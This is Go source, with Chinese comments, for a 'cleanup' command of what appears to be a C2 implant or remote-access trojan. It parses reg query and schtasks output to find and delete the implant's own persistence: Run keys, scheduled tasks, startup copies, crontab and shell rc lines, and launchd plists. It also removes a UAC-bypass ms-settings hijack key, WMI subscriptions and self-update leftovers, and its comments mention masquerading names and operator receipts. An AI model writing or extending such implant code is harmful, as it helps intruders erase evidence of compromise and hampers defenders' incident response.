package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ===== P1: 清理现场 =====
// cleanup [范围...]：范围 ∈ all|persist|files|uac|wmi（默认 all）。
//
// 只清理**本程序自己留下的东西**，不做通用的"清日志/清痕迹"（那属于另一个东西，
// 且误删风险由操作员承担，不适合塞进一个无参数命令）：
//   persist — 注册表 Run / 计划任务 / 启动文件夹 / crontab / shell rc / launchd plist
//   files   — 自我更新的 <exe>.old 残留、%TEMP% 下更新临时文件
//   uac     — getsystem uac 留下的 HKCU ms-settings 劫持键（Windows）
//   wmi     — wmi_persist 留下的事件订阅（Windows）
//
// 全部动作 best-effort：单条失败记 ⚠️ 并继续，不返回错误——C2 回执里操作员要的是
// "哪一条没清掉"，而不是一个 500 字样的整体失败。

// cleanupLevel 单条结果级别
type cleanupLevel int

const (
	cleanupOK cleanupLevel = iota
	cleanupWarn
	cleanupSkip
)

// cleanupItem 一条清理结果
type cleanupItem struct {
	level cleanupLevel
	text  string
}

func cOK(format string, a ...any) cleanupItem {
	return cleanupItem{cleanupOK, fmt.Sprintf(format, a...)}
}
func cWarn(format string, a ...any) cleanupItem {
	return cleanupItem{cleanupWarn, fmt.Sprintf(format, a...)}
}
func cSkip(format string, a ...any) cleanupItem {
	return cleanupItem{cleanupSkip, fmt.Sprintf(format, a...)}
}

// cleanupScopes 清理范围
type cleanupScopes struct {
	persist bool
	files   bool
	uac     bool
	wmi     bool
}

func (s cleanupScopes) String() string {
	var parts []string
	if s.persist {
		parts = append(parts, "persist")
	}
	if s.files {
		parts = append(parts, "files")
	}
	if s.uac {
		parts = append(parts, "uac")
	}
	if s.wmi {
		parts = append(parts, "wmi")
	}
	if len(parts) == 0 {
		return "none"
	}
	return strings.Join(parts, "+")
}

// parseCleanupSpec 解析范围串；空串等价 all。
func parseCleanupSpec(spec string) (cleanupScopes, error) {
	fields := strings.Fields(strings.ToLower(strings.TrimSpace(spec)))
	if len(fields) == 0 {
		return cleanupScopes{persist: true, files: true, uac: true, wmi: true}, nil
	}
	var sc cleanupScopes
	for _, f := range fields {
		switch f {
		case "all":
			sc.persist, sc.files, sc.uac, sc.wmi = true, true, true, true
		case "persist":
			sc.persist = true
		case "files":
			sc.files = true
		case "uac":
			sc.uac = true
		case "wmi":
			sc.wmi = true
		default:
			return sc, fmt.Errorf("未知清理范围 %q（可用 all|persist|files|uac|wmi）", f)
		}
	}
	return sc, nil
}

// Cleanup 清理现场：按范围执行各平台清理动作，汇总成回执。
// 除范围串非法外不返回错误（失败项在回执里逐条标 ⚠️）。
func Cleanup(spec string) ([]byte, error) {
	sc, err := parseCleanupSpec(spec)
	if err != nil {
		return nil, err
	}
	exe, eerr := selfExecutablePath()
	var items []cleanupItem
	if eerr != nil {
		items = append(items, cWarn("定位自身路径失败（持久化项可能漏清）: %v", eerr))
	} else if sc.persist {
		items = append(items, cleanupPersistItems(exe)...)
	}
	if sc.files {
		items = append(items, cleanupFileItems(exe)...)
	}
	items = append(items, cleanupPlatformItems(exe, sc)...)
	return []byte(renderCleanupReport(sc, items)), nil
}

// renderCleanupReport 汇总回执：首行范围，逐条 ✅/⚠️/⏭️，末行计数。
func renderCleanupReport(sc cleanupScopes, items []cleanupItem) string {
	okN, warnN, skipN := 0, 0, 0
	lines := make([]string, 0, len(items)+2)
	lines = append(lines, fmt.Sprintf("🧹 清理现场（范围=%s）", sc.String()))
	for _, it := range items {
		switch it.level {
		case cleanupOK:
			okN++
			lines = append(lines, "✅ "+it.text)
		case cleanupWarn:
			warnN++
			lines = append(lines, "⚠️ "+it.text)
		default:
			skipN++
			lines = append(lines, "⏭️ "+it.text)
		}
	}
	lines = append(lines, fmt.Sprintf("—— 已清理 %d 项，失败 %d 项，跳过 %d 项", okN, warnN, skipN))
	return strings.Join(lines, "\n")
}

// selfExecutablePath 取自身真实路径（解析符号链接；launchd 记录的是真实路径）。
func selfExecutablePath() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}
	if resolved, rerr := filepath.EvalSymlinks(exe); rerr == nil {
		exe = resolved
	}
	return exe, nil
}

// normalizePathForCompare 路径比较用归一化：去引号、去尾部空格、统一分隔符、小写。
func normalizePathForCompare(p string) string {
	p = strings.TrimSpace(p)
	p = strings.Trim(p, `"`)
	p = strings.TrimSpace(p)
	p = strings.ReplaceAll(p, `\`, "/")
	p = strings.TrimRight(p, "/")
	return strings.ToLower(p)
}

// regRunValueNames 从 `reg query <Run 键>` 输出里挑出数据指向 exe 的值名。
// 输出形如（值名与数据之间以 REG_SZ 分隔，数据可能含空格）：
//
//	HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
//	    SvcHost    REG_SZ    C:\Users\a\AppData\Local\Temp\x.exe
//
// 类型只认 REG_SZ / REG_EXPAND_SZ 两种：两者数据都是可执行路径，只是后者会被展开
// 环境变量。其它类型（REG_BINARY 等）的数据不是路径，不参与比对。
func regRunValueNames(out, exe string) []string {
	target := normalizePathForCompare(exe)
	if target == "" {
		return nil
	}
	var names []string
	for _, raw := range strings.Split(out, "\n") {
		line := strings.TrimRight(raw, "\r")
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(strings.ToUpper(trimmed), "HKEY") {
			continue
		}
		idx, typLen := -1, 0
		// REG_EXPAND_SZ 不含子串 REG_SZ，两种类型各自找、取更靠前的那个
		if i := strings.Index(line, "REG_EXPAND_SZ"); i >= 0 {
			idx, typLen = i, len("REG_EXPAND_SZ")
		}
		if i := strings.Index(line, "REG_SZ"); i >= 0 && (idx < 0 || i < idx) {
			idx, typLen = i, len("REG_SZ")
		}
		if idx < 0 {
			continue
		}
		name := strings.TrimSpace(line[:idx])
		data := strings.TrimSpace(line[idx+typLen:])
		data = strings.Trim(data, `"`)
		if name == "" {
			continue
		}
		if normalizePathForCompare(data) == target {
			names = append(names, name)
		}
	}
	return names
}

// taskNamesForExe 从 `schtasks /query /fo list /v` 输出里挑出 Task To Run 指向 exe
// 的任务名。不按列位置解析（各版本列序/列数不同），而是"命中路径行 → 往上找所属
// 任务名"；任务名按原始字节保留（中文名字回传给 schtasks 才不会变形）。
func taskNamesForExe(out, exe string) []string {
	target := normalizePathForCompare(exe)
	if target == "" {
		return nil
	}
	lines := strings.Split(out, "\n")
	var names []string
	seen := map[string]bool{}
	for i, raw := range lines {
		line := strings.TrimRight(raw, "\r")
		if !strings.Contains(normalizePathForCompare(line), target) {
			continue
		}
		// Author 字段里出现本程序路径很常见（进程是用某个本地路径起的也不一定），
		// 但它不指向任务，误认会去删别人的任务——宁可漏删也不误删。
		if key, _, ok := splitKeyValue(strings.TrimSpace(line)); ok && isAuthorKey(key) {
			continue
		}
		name := taskNameAbove(lines, i)
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		names = append(names, name)
	}
	return names
}

// taskNameAbove 从路径行往上找所属任务名。优先认标签（TaskName:/任务名:）；
// 系统把控制台输出转成 GBK 时 UTF-8 标签匹配不上，退化为"值以 \ 开头、且不是
// 运行命令行/作者的那一行"——任务名在两种语言下都以 \ 开头，值本身是路径字节。
func taskNameAbove(lines []string, idx int) string {
	const lookback = 20
	for j := idx - 1; j >= 0 && idx-j <= lookback; j-- {
		trimmed := strings.TrimSpace(strings.TrimRight(lines[j], "\r"))
		if trimmed == "" {
			continue
		}
		if n, ok := taskNameLine(trimmed); ok && n != "" {
			return n
		}
	}
	for j := idx - 1; j >= 0 && idx-j <= lookback; j-- {
		trimmed := strings.TrimSpace(strings.TrimRight(lines[j], "\r"))
		key, val, ok := splitKeyValue(trimmed)
		if !ok || !strings.HasPrefix(val, `\`) {
			continue
		}
		lk := strings.ToLower(key)
		if isAuthorKey(key) || strings.Contains(lk, "run") || strings.Contains(lk, "运行") {
			continue
		}
		return val
	}
	return ""
}

// splitKeyValue 把 "Key: value" 拆成两段（值里允许再出现冒号）。
func splitKeyValue(line string) (key, val string, ok bool) {
	i := strings.Index(line, ":")
	if i <= 0 {
		return "", "", false
	}
	return strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:]), true
}

// isAuthorKey 判断字段名是否"作者"类（ASCII 与中文两种写法都要认）。
func isAuthorKey(key string) bool {
	lk := strings.ToLower(key)
	return strings.Contains(lk, "author") || strings.Contains(lk, "作者")
}

// taskNameLine 判断一行是否任务名行，返回任务名。
func taskNameLine(trimmed string) (string, bool) {
	lower := strings.ToLower(trimmed)
	for _, key := range []string{"taskname:", "任务名:"} {
		if strings.HasPrefix(lower, key) {
			return strings.TrimSpace(trimmed[len(key):]), true
		}
	}
	return "", false
}

// startupFileMatches 启动文件夹里的文件是否我方持久化副本：
// 同名（大小写不敏感），或同大小且同扩展名（persist startup 按 name+".exe" 拷贝，
// 名字可能被 masquerade 前缀改动，大小相同是非常强的信号）。
func startupFileMatches(candidateBase string, candidateSize int64, exePath string, exeSize int64) bool {
	if candidateBase == "" {
		return false
	}
	if strings.EqualFold(candidateBase, filepath.Base(exePath)) {
		return true
	}
	if exeSize > 0 && candidateSize == exeSize &&
		strings.EqualFold(filepath.Ext(candidateBase), filepath.Ext(exePath)) {
		return true
	}
	return false
}

// filterLinesReferencing 从文本里删掉含 path 的行（crontab / shell rc 清理）。
func filterLinesReferencing(text, path string) (kept string, removed []string) {
	trimmedPath := strings.TrimSpace(path)
	if trimmedPath == "" {
		return text, nil
	}
	needle := strings.ToLower(trimmedPath)
	lines := strings.Split(text, "\n")
	keep := make([]string, 0, len(lines))
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), needle) {
			if s := strings.TrimSpace(line); s != "" {
				removed = append(removed, s)
			}
			continue
		}
		keep = append(keep, line)
	}
	return strings.Join(keep, "\n"), removed
}

// plistReferencesPath 判断 launchd plist 内容是否启动 path。
func plistReferencesPath(content, path string) bool {
	p := strings.TrimSpace(path)
	if p == "" {
		return false
	}
	return strings.Contains(strings.ToLower(content), strings.ToLower(p))
}

// updateResiduePatterns 自我更新临时文件的匹配模式（self_update 落在 %TEMP%）：
// 形如 ~<masq>_update_<nanos>.exe。
func updateResiduePatterns(dir string) []string {
	return []string{
		filepath.Join(dir, "~*_update_*.exe"),
		filepath.Join(dir, "~*_update_*.dll"),
	}
}

// findUpdateResidues 在 dir 下找自我更新的临时文件（下载完成前被杀会留下）。
func findUpdateResidues(dir string) []string {
	if strings.TrimSpace(dir) == "" {
		return nil
	}
	var out []string
	for _, pat := range updateResiduePatterns(dir) {
		matches, _ := filepath.Glob(pat)
		out = append(out, matches...)
	}
	return out
}

// removeWithRetry 删除文件；被占用时短暂重试（更新后旧进程退出要时间）。
// 文件本就不存在视为成功。
func removeWithRetry(path string, attempts int, wait time.Duration) error {
	if attempts < 1 {
		attempts = 1
	}
	var err error
	for i := 0; i < attempts; i++ {
		err = os.Remove(path)
		if err == nil || os.IsNotExist(err) {
			return nil
		}
		if i < attempts-1 {
			time.Sleep(wait)
		}
	}
	return err
}

// cleanupOldBinary 清理自我更新残留的 <exe>.old（各平台共用）。
func cleanupOldBinary(exe string) []cleanupItem {
	if strings.TrimSpace(exe) == "" {
		return []cleanupItem{cSkip("未知自身路径，跳过更新残留")}
	}
	oldPath := exe + ".old"
	if _, err := os.Stat(oldPath); err != nil {
		return []cleanupItem{cSkip("无更新残留 %s", filepath.Base(oldPath))}
	}
	if err := removeWithRetry(oldPath, 5, 200*time.Millisecond); err != nil {
		return []cleanupItem{cWarn("更新残留 %s 删除失败（旧进程可能未退出）: %v", filepath.Base(oldPath), err)}
	}
	return []cleanupItem{cOK("更新残留 %s 已删除", filepath.Base(oldPath))}
}

// trimReplyMarker 去掉子命令回执的前缀标记，便于拼进统一回执。
func trimReplyMarker(b []byte) string {
	s := strings.TrimSpace(string(b))
	for _, p := range []string{"✅", "[+]", "[!]"} {
		s = strings.TrimSpace(strings.TrimPrefix(s, p))
	}
	return s
}

// PurgeUpdateResidue 启动时后台清理自我更新残留（由 app.Init 异步调用）。
//
// self_update 的流程是：把当前 exe 改名成 <exe>.old → 写新 exe 到原路径 → 重启。
// 新进程起来时旧进程可能还在退出，<exe>.old 的映像句柄未释放，删除会失败，
// 所以这里带重试（最多 ~20s）；进程崩溃留下的 %TEMP% 更新临时文件一并清掉。
func PurgeUpdateResidue() {
	exe, err := selfExecutablePath()
	if err == nil {
		oldPath := exe + ".old"
		for i := 0; i < 40; i++ {
			if rerr := os.Remove(oldPath); rerr == nil || os.IsNotExist(rerr) {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
	}
	for _, p := range findUpdateResidues(os.TempDir()) {
		_ = os.Remove(p)
	}
}
